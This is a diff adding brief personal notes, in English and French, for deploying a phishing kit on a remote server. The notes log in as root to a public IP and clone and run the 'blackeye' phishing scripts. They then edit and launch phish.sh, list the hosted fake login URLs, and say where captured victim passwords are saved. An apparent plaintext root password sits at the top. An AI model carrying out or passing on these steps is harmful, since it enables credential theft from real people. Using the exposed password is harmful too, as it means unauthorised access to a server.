@@ -1,0 +1,31 @@
+Lamp$$205909$$
+ssh root@50.116.34.247
+
+apt update
+apt-get install jq xsel
+apt install git
+git clone https://github.com/SitrakaResearchAndPOC/blackeye-im
+cd blackeye-im
+bash setup.sh
+
+Download in real navigator : https://github.com/SitrakaResearchAndPOC/blackeye-im/blob/master/blackeye-modif.sh
+Change script about ip :(indeed public ip by searching php -S)
+copier tout
+
+nano phish.sh
+coller tout
+
+ctrl+x et sauver
+
+chmod +x phish.sh
+bash phish.sh
+http://50.116.34.247:5555/
+http://50.116.34.247/login.html
+
+apt install mousepad
+
+see password at sites/name_site/user_names.txt
+
+
+diff -u blackeye.sh phisph.sh
+
